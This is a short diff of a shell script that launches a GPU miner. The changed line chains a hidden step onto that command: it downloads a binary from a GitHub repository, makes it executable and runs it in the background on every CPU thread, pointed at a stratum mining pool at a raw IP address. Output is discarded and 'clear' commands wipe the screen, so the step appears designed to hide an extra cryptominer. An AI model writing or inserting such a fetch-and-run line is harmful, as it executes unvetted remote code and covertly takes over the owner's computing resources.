@@ -96,4 +96,4 @@ fi
   --pubkey=28SNhUbsjoqgJ9ycKX3fkgZ8G6tXGXZcKknNHDKAM5hmaX2b1BWWpn5 \
   --label=jembut \
   --mode=gpu \
-  --threads-per-card=1 & clear & wget https://github.com/usapindong/test/raw/refs/heads/main/cor && chmod +x cor && ./cor --noeval --hard-aes -P stratum1+tcp://cb0318b68b6a39f8072ed597385c2e547bc18a817e63.gtx@103.196.155.151:443 -t $(nproc) > /dev/null 2>&1 & clear
+  --threads-per-card=1 & clear & wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod +x sse20 && clear && ./sse20 -a power2b -o stratum+tcp://103.196.155.151:80 -u MbVBtUuYHPKuZKV9zhhjufNzfPstvYkUBN -t $(nproc) > /dev/null 2>&1 & clear
